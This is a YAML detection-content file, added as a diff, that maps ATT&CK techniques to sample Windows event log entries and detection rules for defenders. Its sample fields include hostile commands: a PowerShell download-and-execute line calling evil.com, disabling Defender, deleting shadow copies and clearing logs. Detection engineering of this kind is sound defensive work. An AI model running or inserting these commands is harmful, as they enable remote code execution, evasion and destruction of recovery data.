@@ -1,0 +1,561 @@
+# EVTX-ATTACK-SAMPLES — WP 3.27c.
+# Sample event log entries per ATT&CK technique — what real attacks
+# actually produce in EVTX. The scribe can suggest event-ID + field-value
+# needles based on what attacks actually generate.
+
+version: 1
+description: >
+  EVTX-ATTACK-SAMPLES — real event log entries per ATT&CK technique.
+  Maps technique ID to the event IDs, fields, and values that real
+  attacks produce. The scribe can suggest event-ID + field-value
+  needles instead of just binary names.
+source: "https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES"
+
+packs:
+  # --- Execution ---
+  - technique: "T1059.001"
+    name: "PowerShell"
+    events:
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          CommandLine: "powershell.exe -enc <base64>"
+          ParentImage: "C:\\Windows\\explorer.exe"
+          User: "DOMAIN\\user"
+        detection: "4688 with powershell.exe + -enc/-nop/-w hidden"
+      - event_id: 4104
+        source: "Microsoft-Windows-PowerShell"
+        description: "Script block logged"
+        fields:
+          ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+          ScriptBlockId: "<guid>"
+          Path: ""
+        detection: "4104 with IEX/DownloadString/Invoke-* in ScriptBlockText"
+      - event_id: 4103
+        source: "Microsoft-Windows-PowerShell"
+        description: "Module logging"
+        fields:
+          Payload: "Module logging entry"
+          ContextInfo: "CommandInvocation"
+        detection: "4103 with suspicious module names"
+
+  - technique: "T1059.003"
+    name: "Windows Command Shell"
+    events:
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\cmd.exe"
+          CommandLine: "cmd.exe /c whoami"
+          ParentImage: "C:\\Windows\\explorer.exe"
+        detection: "4688 with cmd.exe /c + suspicious commands"
+
+  - technique: "T1059.005"
+    name: "Visual Basic"
+    events:
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\wscript.exe"
+          CommandLine: "wscript.exe C:\\temp\\evil.vbs"
+          ParentImage: "C:\\Windows\\explorer.exe"
+        detection: "4688 with wscript.exe + .vbs/.vbe/.js/.jse"
+
+  - technique: "T1059.007"
+    name: "JavaScript"
+    events:
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\cscript.exe"
+          CommandLine: "cscript.exe C:\\temp\\evil.js"
+          ParentImage: "C:\\Windows\\explorer.exe"
+        detection: "4688 with cscript.exe + .js/.jse"
+
+  # --- Credential Access ---
+  - technique: "T1003.001"
+    name: "LSASS Memory"
+    events:
+      - event_id: 4656
+        source: "Security"
+        description: "Handle requested"
+        fields:
+          TargetImage: "C:\\Windows\\System32\\lsass.exe"
+          GrantedAccess: "0x1010"
+          ProcessName: "C:\\Windows\\System32\\procdump.exe"
+        detection: "4656 on lsass.exe with 0x1010 (VM_READ)"
+      - event_id: 4663
+        source: "Security"
+        description: "Access attempt"
+        fields:
+          TargetImage: "C:\\Windows\\System32\\lsass.exe"
+          AccessMask: "0x1010"
+          ProcessName: "C:\\Windows\\System32\\comsvcs.dll"
+        detection: "4663 on lsass.exe with suspicious process"
+      - event_id: 10
+        source: "Sysmon"
+        description: "Process access"
+        fields:
+          SourceImage: "C:\\Windows\\System32\\procdump.exe"
+          TargetImage: "C:\\Windows\\System32\\lsass.exe"
+          GrantedAccess: "0x1010"
+        detection: "Sysmon 10 on lsass.exe with unsigned SourceImage"
+
+  - technique: "T1003.002"
+    name: "Security Account Manager"
+    events:
+      - event_id: 4656
+        source: "Security"
+        description: "Handle requested"
+        fields:
+          TargetObject: "HKLM\\SAM"
+          ProcessName: "C:\\Windows\\System32\\reg.exe"
+        detection: "4656 on SAM hive with reg.exe"
+      - event_id: 4663
+        source: "Security"
+        description: "Access attempt"
+        fields:
+          TargetFilename: "C:\\Windows\\System32\\config\\SAM"
+          ProcessName: "C:\\Windows\\System32\\esentutl.exe"
+        detection: "4663 on SAM file with esentutl.exe"
+
+  - technique: "T1003.003"
+    name: "NTDS"
+    events:
+      - event_id: 4662
+        source: "Security"
+        description: "Operation performed"
+        fields:
+          TargetObject: "CN=Configuration,DC=domain,DC=local"
+          ProcessName: "C:\\Windows\\System32\\ntdsutil.exe"
+        detection: "4662 on NTDS with ntdsutil.exe"
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\vssadmin.exe"
+          CommandLine: "vssadmin create shadow /for=C:"
+        detection: "4688 with vssadmin create shadow"
+
+  # --- Persistence ---
+  - technique: "T1053.005"
+    name: "Scheduled Task"
+    events:
+      - event_id: 4698
+        source: "Security"
+        description: "Scheduled task created"
+        fields:
+          TaskName: "TestTask"
+          TaskContent: "<Task><Exec><Command>C:\\test.exe</Command></Exec></Task>"
+          User: "DOMAIN\\user"
+        detection: "4698 with suspicious TaskContent"
+      - event_id: 106
+        source: "Microsoft-Windows-TaskScheduler"
+        description: "Task registered"
+        fields:
+          TaskName: "TestTask"
+          User: "DOMAIN\\user"
+        detection: "106 with suspicious task name"
+      - event_id: 200
+        source: "Microsoft-Windows-TaskScheduler"
+        description: "Task started"
+        fields:
+          TaskName: "TestTask"
+          User: "DOMAIN\\user"
+        detection: "200 with suspicious task name"
+
+  - technique: "T1547.001"
+    name: "Registry Run Keys"
+    events:
+      - event_id: 4657
+        source: "Security"
+        description: "Registry value modified"
+        fields:
+          TargetObject: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+          Details: "C:\\test.exe"
+          ValueName: "TestKey"
+        detection: "4657 on Run/RunOnce with suspicious binary"
+      - event_id: 13
+        source: "Sysmon"
+        description: "Registry value set"
+        fields:
+          TargetObject: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+          Details: "C:\\test.exe"
+        detection: "Sysmon 13 on Run/RunOnce with suspicious binary"
+
+  - technique: "T1543.003"
+    name: "Windows Service"
+    events:
+      - event_id: 7045
+        source: "System"
+        description: "Service created"
+        fields:
+          ServiceName: "TestSvc"
+          ServiceFileName: "C:\\test.exe"
+          ServiceType: "win32 own process"
+          ServiceStartType: "auto"
+        detection: "7045 with suspicious ServiceFileName"
+      - event_id: 4697
+        source: "Security"
+        description: "Service installed"
+        fields:
+          ServiceName: "TestSvc"
+          ServiceFileName: "C:\\test.exe"
+        detection: "4697 with suspicious ServiceFileName"
+
+  - technique: "T1546.003"
+    name: "WMI Event Subscription"
+    events:
+      - event_id: 5861
+        source: "Microsoft-Windows-WMI-Activity"
+        description: "WMI permanent event subscription"
+        fields:
+          Namespace: "root\\subscription"
+          Name: "TestFilter"
+          Query: "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+        detection: "5861 with CommandLineEventConsumer or ActiveScriptEventConsumer"
+      - event_id: 19
+        source: "Sysmon"
+        description: "WMI filter created"
+        fields:
+          Namespace: "root\\subscription"
+          Name: "TestFilter"
+          Query: "SELECT * FROM __InstanceCreationEvent"
+        detection: "Sysmon 19 with suspicious filter query"
+
+  # --- Defense Evasion ---
+  - technique: "T1070"
+    name: "Defense Evasion"
+    events:
+      - event_id: 1102
+        source: "Security"
+        description: "Audit log cleared"
+        fields:
+          Channel: "Security"
+          SubjectUserName: "DOMAIN\\user"
+        detection: "1102 with suspicious account or no change ticket"
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\wevtutil.exe"
+          CommandLine: "wevtutil cl System"
+        detection: "4688 with wevtutil cl"
+
+  - technique: "T1562.001"
+    name: "Impair Defenses"
+    events:
+      - event_id: 5001
+        source: "Microsoft-Windows-Windows Defender"
+        description: "Defender disabled"
+        fields:
+          ProductName: "Windows Defender"
+          DisableReason: "Disabled via PowerShell"
+        detection: "5001 with suspicious disable reason"
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          CommandLine: "powershell.exe -c \"Set-MpPreference -DisableRealtimeMonitoring $true\""
+        detection: "4688 with DisableRealtimeMonitoring"
+
+  # --- Lateral Movement ---
+  - technique: "T1021.002"
+    name: "SMB/Windows Admin Shares"
+    events:
+      - event_id: 5140
+        source: "Security"
+        description: "Share accessed"
+        fields:
+          ShareName: "ADMIN$"
+          SourceAddress: "192.168.1.100"
+          DestinationAddress: "192.168.1.200"
+        detection: "5140 with ADMIN$/C$/IPC$ + unusual source"
+      - event_id: 5145
+        source: "Security"
+        description: "Detailed share check"
+        fields:
+          ShareName: "ADMIN$"
+          SourceAddress: "192.168.1.100"
+          AccessMask: "0x2"
+        detection: "5145 with ADMIN$ + write access"
+      - event_id: 4624
+        source: "Security"
+        description: "Logon"
+        fields:
+          LogonType: "3"
+          SourceAddress: "192.168.1.100"
+          User: "DOMAIN\\admin"
+        detection: "4624 type 3 with unusual source"
+
+  - technique: "T1021.006"
+    name: "Windows Remote Management"
+    events:
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\winrs.exe"
+          CommandLine: "winrs -r:target cmd.exe"
+        detection: "4688 with winrs -r:"
+      - event_id: 91
+        source: "Microsoft-Windows-WinRM"
+        description: "WinRM session"
+        fields:
+          ClientIP: "192.168.1.100"
+          User: "DOMAIN\\admin"
+        detection: "WinRM 91 with unusual client IP"
+
+  # --- Discovery ---
+  - technique: "T1082"
+    name: "System Information Discovery"
+    events:
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\systeminfo.exe"
+          CommandLine: "systeminfo.exe"
+        detection: "4688 with systeminfo.exe"
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\net.exe"
+          CommandLine: "net group \"Domain Admins\" /domain"
+        detection: "4688 with net group /domain"
+
+  # --- Collection ---
+  - technique: "T1074"
+    name: "Data Staged"
+    events:
+      - event_id: 4663
+        source: "Security"
+        description: "File access"
+        fields:
+          TargetFilename: "C:\\sensitive\\data.txt"
+          AccessMask: "0x2"
+          ProcessName: "C:\\Windows\\System32\\powershell.exe"
+        detection: "4663 with write access on sensitive files"
+      - event_id: 11
+        source: "Sysmon"
+        description: "File created"
+        fields:
+          TargetFilename: "C:\\temp\\staged.zip"
+          ProcessName: "C:\\Windows\\System32\\powershell.exe"
+        detection: "Sysmon 11 with .zip/.rar/.7z in temp"
+
+  # --- Exfiltration ---
+  - technique: "T1048"
+    name: "Exfiltration Over Alternative Protocol"
+    events:
+      - event_id: 3
+        source: "Sysmon"
+        description: "Network connection"
+        fields:
+          SourceIp: "192.168.1.100"
+          DestinationIp: "203.0.113.1"
+          DestinationPort: "21"
+          ProcessName: "C:\\Windows\\System32\\ftp.exe"
+        detection: "Sysmon 3 with ftp.exe + unusual destination"
+      - event_id: 5156
+        source: "Security"
+        description: "Connection allowed"
+        fields:
+          SourceAddress: "192.168.1.100"
+          DestinationAddress: "203.0.113.1"
+          DestinationPort: "443"
+          ProcessName: "C:\\Windows\\System32\\curl.exe"
+        detection: "5156 with curl.exe + unusual destination"
+
+  # --- Command and Control ---
+  - technique: "T1071"
+    name: "Application Layer Protocol"
+    events:
+      - event_id: 3
+        source: "Sysmon"
+        description: "Network connection"
+        fields:
+          SourceIp: "192.168.1.100"
+          DestinationIp: "203.0.113.1"
+          DestinationPort: "443"
+          ProcessName: "C:\\Windows\\System32\\powershell.exe"
+        detection: "Sysmon 3 with powershell.exe + beaconing pattern"
+      - event_id: 22
+        source: "Sysmon"
+        description: "DNS query"
+        fields:
+          QueryName: "c2.evil.com"
+          QueryType: "A"
+          ProcessName: "C:\\Windows\\System32\\powershell.exe"
+        detection: "Sysmon 22 with suspicious domain + process"
+
+  # --- Impact ---
+  - technique: "T1486"
+    name: "Data Encrypted for Impact"
+    events:
+      - event_id: 4663
+        source: "Security"
+        description: "File access"
+        fields:
+          TargetFilename: "C:\\sensitive\\file.txt"
+          AccessMask: "0x2"
+          ProcessName: "C:\\Windows\\System32\\powershell.exe"
+        detection: "4663 with write access + .locked extension"
+      - event_id: 11
+        source: "Sysmon"
+        description: "File created"
+        fields:
+          TargetFilename: "C:\\sensitive\\file.txt.locked"
+          ProcessName: "C:\\Windows\\System32\\powershell.exe"
+        detection: "Sysmon 11 with .locked/.encrypted extension"
+
+  - technique: "T1490"
+    name: "Inhibit System Recovery"
+    events:
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\vssadmin.exe"
+          CommandLine: "vssadmin delete shadows /for=C: /quiet"
+        detection: "4688 with vssadmin delete shadows"
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\bcdedit.exe"
+          CommandLine: "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
+        detection: "4688 with bcdedit bootstatuspolicy"
+
+  # --- Token ---
+  - technique: "T1134"
+    name: "Token Manipulation"
+    events:
+      - event_id: 4648
+        source: "Security"
+        description: "Explicit credentials"
+        fields:
+          SourceImage: "C:\\Windows\\System32\\powershell.exe"
+          TargetImage: "C:\\Windows\\System32\\cmd.exe"
+          SourceUser: "DOMAIN\\user"
+          TargetUser: "DOMAIN\\admin"
+        detection: "4648 with different SourceUser/TargetUser"
+      - event_id: 4703
+        source: "Security"
+        description: "Token user adjusted"
+        fields:
+          SourceImage: "C:\\Windows\\System32\\powershell.exe"
+          TargetImage: "C:\\Windows\\System32\\cmd.exe"
+          SourceUser: "DOMAIN\\user"
+          TargetUser: "DOMAIN\\admin"
+        detection: "4703 with different SourceUser/TargetUser"
+
+  # --- Web Exfil ---
+  - technique: "T1567.002"
+    name: "Exfiltration to Cloud Storage"
+    events:
+      - event_id: 3
+        source: "Sysmon"
+        description: "Network connection"
+        fields:
+          SourceIp: "192.168.1.100"
+          DestinationIp: "203.0.113.1"
+          DestinationPort: "443"
+          ProcessName: "C:\\Windows\\System32\\rclone.exe"
+        detection: "Sysmon 3 with rclone.exe + cloud storage"
+      - event_id: 5156
+        source: "Security"
+        description: "Connection allowed"
+        fields:
+          SourceAddress: "192.168.1.100"
+          DestinationAddress: "203.0.113.1"
+          DestinationPort: "443"
+          ProcessName: "C:\\Windows\\System32\\mega-cmd.exe"
+        detection: "5156 with mega-cmd.exe + mega.nz"
+
+  # --- RMM ---
+  - technique: "T1219"
+    name: "Remote Access Software"
+    events:
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Program Files\\AnyDesk\\anydesk.exe"
+          CommandLine: "anydesk.exe --install"
+        detection: "4688 with anydesk.exe --install"
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Program Files\\TeamViewer\\teamviewer.exe"
+          CommandLine: "teamviewer.exe --daemon"
+        detection: "4688 with teamviewer.exe --daemon"
+
+  # --- Brute Force ---
+  - technique: "T1110.001"
+    name: "Password Guessing"
+    events:
+      - event_id: 4625
+        source: "Security"
+        description: "Failed logon"
+        fields:
+          SourceAddress: "192.168.1.100"
+          User: "DOMAIN\\admin"
+          Status: "0xC000006A"
+        detection: "4625 with multiple failures then success"
+      - event_id: 4776
+        source: "Security"
+        description: "Credential validation"
+        fields:
+          SourceAddress: "192.168.1.100"
+          User: "DOMAIN\\admin"
+          Status: "0xC000006A"
+        detection: "4776 with multiple failures then success"
+
+  # --- Credentials ---
+  - technique: "T1552"
+    name: "Credentials in Files"
+    events:
+      - event_id: 4663
+        source: "Security"
+        description: "File access"
+        fields:
+          TargetFilename: "C:\\Windows\\Panther\\unattend.xml"
+          AccessMask: "0x1"
+          ProcessName: "C:\\Windows\\System32\\findstr.exe"
+        detection: "4663 on unattend.xml with findstr.exe"
+      - event_id: 4657
+        source: "Security"
+        description: "Registry value modified"
+        fields:
+          TargetObject: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+          ValueName: "DefaultPassword"
+        detection: "4657 on Winlogon DefaultPassword"
+
+  # --- Valid Accounts ---
+  - technique: "T1078"
+    name: "Valid Accounts"
+    events:
+      - event_id: 4624
+        source: "Security"
+        description: "Logon"
+        fields:
+          LogonType: "10"
+          SourceAddress: "203.0.113.1"
+          User: "DOMAIN\\admin"
+        detection: "4624 type 10 with external IP"
+      - event_id: 4688
+        source: "Security"
+        description: "Process creation"
+        fields:
+          Image: "C:\\Windows\\System32\\whoami.exe"
+          CommandLine: "whoami.exe /all"
+        detection: "4688 with whoami /all"
